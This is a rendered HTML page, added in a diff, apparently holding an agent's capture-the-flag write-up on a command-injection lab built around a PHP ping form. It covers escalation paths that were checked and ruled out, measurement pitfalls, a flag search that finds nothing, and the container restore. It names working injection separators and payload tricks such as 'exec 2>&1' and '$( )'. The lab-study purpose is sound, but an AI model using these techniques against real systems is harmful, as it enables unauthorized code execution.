+<td><strong>No — absent by design</strong></td>
+<td><strong>10</strong> consecutive requests, <strong>0</strong> <code>[response-cookie-header]</code> headers emitted; and the whole docroot is 2 files, so &quot;no auth&quot; is also a completeness claim, not a sampling one</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="not-tested-vs-discarded-with-reason">NOT tested vs discarded with reason</h2>
+<p>Two separate lists, per the runbook. <strong>A count of zero is UNTESTED, not a negative.</strong></p>
+<h3 id="not-tested-a-count-of-zero-means-untested">NOT tested (a count of zero means untested)</h3>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Why untested</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Argument injection into <code>ping</code></strong> (CWE-88) — <code>?target=-f</code>, <code>?target=-p</code>, <code>?target=--help</code></td>
+<td>The <code>ping</code> binary does not exist (F2). <strong>0</strong> argument-injection payloads were meaningfully executed: the shell resolved the name and exited <code>127</code> before <code>ping</code> could parse anything. This is a real CWE-88 surface in the design and it is <strong>unreachable on this image</strong></td>
+</tr>
+<tr>
+<td>CWE-88 impact as a non-root user (<code>-f</code> flood, <code>-I</code> source, <code>-p</code> pattern writing to stdout)</td>
+<td>Same cause. <code>ping -h</code> via the sink returned <code>sh: 11: ping: not found</code>, <code>ping_rc=127</code> — zero information about <code>ping</code>'s own argument surface</td>
+</tr>
+<tr>
+<td>Exfiltration over ICMP/DNS (the classic use of a ping sink)</td>
+<td>Same cause. Without <code>ping</code> there is no second channel; the only channel is the HTTP response body, which the in-band markers already use</td>
+</tr>
+<tr>
+<td>Kernel-level surface of ICMP sockets (<code>SOCK_DGRAM</code> vs raw)</td>
+<td>Untested: no <code>ping</code>, and no capability to create a raw socket (<code>CapEff=0</code>)</td>
+</tr>
+<tr>
+<td>Time-based blind confirmation (response-time differential)</td>
+<td>Not attempted. Not needed — the in-band oracle and the manufactured file oracle are both decisive, so a weaker instrument was not spent</td>
+</tr>
+<tr>
+<td>Whether the container survives a flood of concurrent requests</td>
+<td>Not attempted. No DoS testing was in scope for this engagement</td>
+</tr>
+</tbody>
+</table>
+<h3 id="discarded-with-a-reason">Discarded with a reason</h3>
+<table>
+<thead>
+<tr>
+<th>Candidate</th>
+<th>Discarded because</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>setuid</code> binaries as an escalation</td>
+<td>13 enumerated, all stock Ubuntu, <strong>no undeclared grant</strong>. Lab 189's escalation was <em>exactly</em> an undeclared <code>sudoers</code> line; there is no <code>sudoers</code> file on this image at all (<code>/etc/sudoers</code>: <code>No such file or directory</code>, <code>/etc/sudoers.d/</code>: <code>No such file or directory</code>)</td>
+</tr>
+<tr>
+<td><code>e2scrub_all</code> / <code>php</code> cron scripts as a write target</td>
+<td>Root-owned <code>0644</code> in a <code>0755</code> directory; the write was <strong>attempted</strong> and returned <code>rc=2</code>. And the cron daemon is not running (<code>pgrep</code> rc 1)</td>
+</tr>
+<tr>
+<td><code>su</code> → <code>ubuntu</code> → <code>[lab-home]/ubuntu</code></td>
+<td><code>ubuntu:!:…</code> — the field is <code>!</code>, not a hash. <strong>1</strong> account checked, <strong>0</strong> with a password. And <code>[lab-home]/ubuntu</code> is <code>0750 ubuntu:ubuntu</code>, unreadable by <code>uid=33</code></td>
+</tr>
+<tr>
+<td><code>/run/apache2/socks</code> (a writable dir in the list of 8)</td>
+<td>Writable by <code>www-data</code>, but nothing in the image consumes it. Listed as writable-inert rather than claimed as a path</td>
+</tr>
+<tr>
+<td><code>/var/lib/php/sessions</code> (writable)</td>
+<td>No application in the docroot uses sessions — 2 files, neither references <code>session_start</code>. Writing there has no reader</td>
+</tr>
+<tr>
+<td>Docker-socket escape</td>
+<td>Socket absent, 3 client binaries absent, userns not remapped. <strong>Not a negative from a broken tool:</strong> the <code>ls</code> returned <code>No such file or directory</code> rather than nothing</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="instrumentation-defects">Instrumentation defects</h2>
+<p>The section worth reading, because two of these four <strong>would have produced a shipped
+result that was false.</strong></p>
+<h3 id="d1--my-first-escalation-probe-returned-nothing-and-i-nearly-filed-it-as-a-control">D1 — My first escalation probe returned nothing, and I nearly filed it as a control</h3>
+<p>A multi-line payload ending in five escalation predicates produced an 1118-byte
+response whose <code>&lt;pre&gt;</code> stopped after the banner. Read carelessly, that is &quot;the target
+refused all five&quot;.</p>
+<p>Cause: <strong><code>shell_exec()</code> captures stdout only.</strong> The <code>Permission denied</code> lines were on
+<strong>stderr</strong>. The fix was to send <code>exec 2&gt;&amp;1</code> as the first line of the payload, after
+which all five produced real output. This is the same family as
+<code>self-corrections.md</code> §15 — <em>a body that reads like a block is not necessarily a
+block</em> — and it is the single most dangerous property of this sink. <strong>Any negative
+taken from the response body of this app is undetermined until stderr is merged.</strong></p>
+<h3 id="d2---failed-and-the-apps-own-missing-dependency-was-the-cause">D2 — <code>&amp;&amp;</code> failed, and the app's own missing dependency was the cause</h3>
+<p>The first payload shapes I reached for are <code>&amp;&amp;</code> and <code>;</code>. <code>;</code> worked immediately.
+<code>&amp;&amp; id -u</code> returned <code>SEP_AND</code> and nothing else. The natural reading — &quot;<code>&amp;&amp;</code> is
+filtered&quot; — is <strong>wrong</strong>, and so is &quot;the injection is flaky&quot;. <code>ping -c 4 127.0.0.1</code>
+exits <code>127</code> because the binary is missing, so <code>&amp;&amp;</code> short-circuits before my command
+runs. Diagnosed by the same instrument that proved <code>;</code> works, in one request:
+<code>command -v ping; echo ping_rc=$?</code> → <code>ping_rc=127</code>.</p>
+<p><strong>The generalisable trap: on a sink whose first command may fail, the operator
+<code>&amp;&amp;</code> tests the <em>application's</em> success, not the injection.</strong> Two of my nine matrix rows
+are shaped by this and one of them is a false negative. A single fixed separator
+(<code>;</code>) would have hidden it; the matrix is what exposed it.</p>
+<h3 id="d3--two-of-my-own-artefacts-polluted-the-reward-search">D3 — Two of my own artefacts polluted the reward search</h3>
+<p>The reward sweep found <code>grep -rIl 'FLAG{' /</code> → <strong>1 file</strong> and <code>'dl{'</code> → <strong>3 files</strong>.
+The first was <strong>my own probe script</strong>, <code>/tmp/r.sh</code>, which I had <code>docker cp</code>'d into the
+container and which contains the literal string <code>FLAG{</code> in its own grep pattern. The
+other two are genuine false positives:</p>
+<pre><code>/usr/include/c++/13/chrono                 -&gt;  dl{__wdl} / dl{__mdl}   (C++ source template macros)
+/usr/lib/python3/dist-packages/pip/_vendor/pygments/formatters/latex.py  -&gt;  dl{\char`\$}
+</code></pre>
+<p>After removing my scripts and re-running: <strong><code>FLAG{</code> in 0 of 15 132 files</strong>,
+<code>dl{</code> in 2 (both the false positives above). This is §14's lesson with a new costume:
+<strong>the searcher's own pattern is a match.</strong> A reward search that reports hits in a
+directory you wrote to is reporting you.</p>
+<h3 id="d4--a-payload-shape-extraction-that-silently-returned-empty-and-i-nearly-read-it-as-does-not-fire">D4 — A payload-shape extraction that silently returned empty, and I nearly read it as &quot;does not fire&quot;</h3>
+<p>My separator matrix used an inline <code>python3 -c</code> inside a shell loop, piped from
+<code>curl -s</code>. It printed <code>pre=''</code> for <strong>every</strong> row — including the <code>;</code> row I had already
+proven fires out-of-band. The <code>pre</code> values were wrong; the payloads were fine. I caught
+it because the <em>byte counts</em> disagreed with the extraction (375 B with an empty <code>&lt;pre&gt;</code>
+is not a self-consistent response), and re-ran the matrix writing each body to its own
+file. The lesson is §17: in a two-stage pipeline, <strong>count the work on each side
+independently</strong> — a byte count that contradicts the parsed field is the tell.</p>
+<hr />
+<h2 id="reward">Reward</h2>
+<p><strong>None. Measured absence, with the search.</strong></p>
+<pre><code>files_total=15132
+grep_FLAG_files=0            (grep -rIl 'FLAG{' / --exclude-dir=proc --exclude-dir=sys)
+grep_dlbrace_files=2         (both C++/LaTeX template false positives, quoted in D3)
+grep_congrats=0              (grep -rIl 'Congratulations' /var/www /root /home /opt /srv)
+name_flag_secret_reward=0    (find -iname, after excluding flags/buildflags/headers/libs)
+html_files=9                 (2 in the docroot: index.html, ping.php — the rest are stock docs)
+docroot_files=2
+posctl_grep_known=1          (control: the same grep returns 1 for shell_exec in ping.php)
+</code></pre>
+<p>15 132 files searched; <strong>0</strong> contain <code>FLAG{</code>. The <code>find -iname</code> pass returned <strong>at least
+20</strong> raw hits on the first run — the listing was truncated at 20 by <code>head</code>, so 20 is a
+lower bound and not a total — and <strong>0</strong> after excluding <code>flags</code>, <code>buildflags</code>,
+<code>page-flags</code>, <code>tty_flags</code>, <code>bitops</code>, <code>/usr/include</code>, <code>/usr/lib</code>, <code>/usr/share</code>. Every
+one of the 20 shown was a C or Perl identifier, listed and read rather than dismissed.
+The search was run <strong>as root</strong> in the instance, so it is not a search that lacked
+permission.</p>
+<p><strong>Nothing is invented here.</strong> Per <code>corpus/INDEX.md</code>'s <code>FLAG{}</code> column, this lab is a
+<code>—</code>, and the count above is what supports it.</p>
+<hr />
+<h2 id="restore">Restore</h2>
+<p>Recreated from the image, not by undoing edits, and verified with a <strong>positive</strong> check
+that includes a byte count that had to return to its shipped value:</p>
+<pre><code>$ docker rm -f ping_ctf_container &amp;&amp; docker run -d --name ping_ctf_container ping_ctf:latest
+restore_index status=200 bytes=1536            &lt;- index.html, shipped size
+restore_ping  status=200 bytes=359             &lt;- the shipped empty-&lt;pre&gt; baseline, identical to first run
+$ docker exec ping_ctf_container ls -la /var/www/html/
+-rwxr-xr-x 1 www-data www-data 1536 Jun 28  2025 index.html
+-rwxr-xr-x 1 www-data www-data  933 Jun 28  2025 ping.php
+</code></pre>
+<p><strong>2 files, shipped sizes, shipped mtimes.</strong> Both oracle files
+(<code>/var/www/html/.oracle_168</code>, <code>/var/www/html/.blind_168</code>) and both scratch scripts
+(<code>/tmp/r.sh</code>, <code>/tmp/r2.sh</code>) are gone. The 359-byte <code>/ping.php</code> response is the
+strongest restore check available here: it is the <em>shipped</em> behaviour, so a restore
+that left my markers in place would have changed it.</p>
+<p>Left running, as the pipeline expects — &quot;restore means the lab is back to shipped&quot;, not
+&quot;the container is deleted&quot;. Image <code>ping_ctf:latest</code> retained until the parent reclaims
+it; no global prune was run, and nothing belonging to another principal was touched.</p>
+<hr />
+<h2 id="next-step">Next step</h2>
+<p><strong>Feed forward: extend the existing row, add nothing new.</strong></p>
+<p>Against <code>RUNBOOK.md</code> §5, the class row that names this lab's question is <strong>WAF / filter
+— &quot;is the filter a string match or a scoring engine, and is the request body even
+inspected?&quot;</strong> Labs 218 and 84 answer &quot;string&quot; and &quot;scoring engine&quot;. This lab answers
+<strong>&quot;neither — there is none, and here is the count that proves it&quot;</strong>, and that is a third
+data point on a row that already exists, not a new heading.</p>
+<p>Two things belong in <code>method/self-corrections.md</code> for the parent to weigh:</p>
+<ol>
+<li><strong>The <code>&amp;&amp;</code> trap (D2).</strong> On a sink whose leading command can fail, <code>&amp;&amp;</code> measures the
+application's success, not the injection. Eight of nine separators fired; the ninth
+was shaped by the app's own missing dependency. Cheapest possible discriminator:
+<code>command -v &lt;the thing you are chaining after&gt;; echo rc=$?</code> in the same payload.</li>
+<li><strong>The stdout-only property (D1).</strong> <code>shell_exec()</code> returns stdout. Every negative
+taken from the response body of such a sink is <strong>undetermined</strong> until <code>exec 2&gt;&amp;1</code>
+is prepended. This is the generalisation of lab 84's &quot;a body that looks like an
+error may be the sink's own error page&quot;: here the body was <em>empty</em>, for the same
+reason.</li>
+</ol>
+<p>Neither is a new class. Both are the same root as §11–§17 — <em>a tool that found nothing
+and a tool that has not looked print the same thing</em> — in a costume the catalogue has
+not worn yet.</p>
+<p><strong>Sibling cross-reads, per rule 8:</strong></p>
+<ul>
+<li><strong>189</strong> — same class, and its real escalation was an <strong>undeclared</strong> <code>sudoers</code> grant.
+This lab has no <code>sudoers</code> file at all and 13 stock setuid binaries, so the two
+writeups are complementary, not contradictory: 189 shows what a chain looks like when
+the lab plants the grant; this one shows that CWE-78 with <strong>no</strong> grant on top is a
+one-hop finding whose severity is bounded by the container's own defaults.</li>
+<li><strong>218 / 84</strong> — both had a filter and the interesting question was which kind. Neither
+contradicts this lab; this lab is the point at which the filter count is zero. The
+§15 <code>&amp;</code>-escaping finding from 189 is <strong>confirmed not to apply here</strong>, and the reason
+is structural rather than coincidental. 189 applies the encoder to the <strong>input</strong> —
+<code>189/ROLAROLA-WRITEUP.md:187</code>, <code>5:     $nombre = htmlspecialchars($_POST[&quot;nombre&quot;]);</code>
+— so <code>&amp;</code> becomes <code>&amp;amp;</code> before the shell ever sees it, and its working payload is
+<code>$( )</code> for exactly that reason (<code>189/ROLAROLA-WRITEUP.md:481</code>: <em>&quot;<code>htmlspecialchars</code>
+does not touch <code>$( )</code>&quot;</em>). Here the encoder is applied only to the <strong>output</strong>
+(<code>ping.php:19</code>) and never to the request, so <code>&amp;</code> reaches <code>/bin/sh</code> intact: measured
+<strong>403 B</strong> for the <code>&amp;</code> payload against the <strong>392 B</strong> <code>;</code> baseline, both carrying <code>33</code>.
+Same function, <strong>different side of the boundary</strong> — which is the point of §15 and is
+now a two-lab measurement rather than a one-lab sample.</li>
+<li><strong>115</strong> — the model for how to close an engagement without an escalation. Lab 115
+reached no RCE and filed its escalation as an inference under NOT tested. <strong>This lab
+reached RCE and closed its escalation as a measurement</strong>, which is the stronger of the
+two positions, and the eleven-row table is why.</li>
+</ul>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
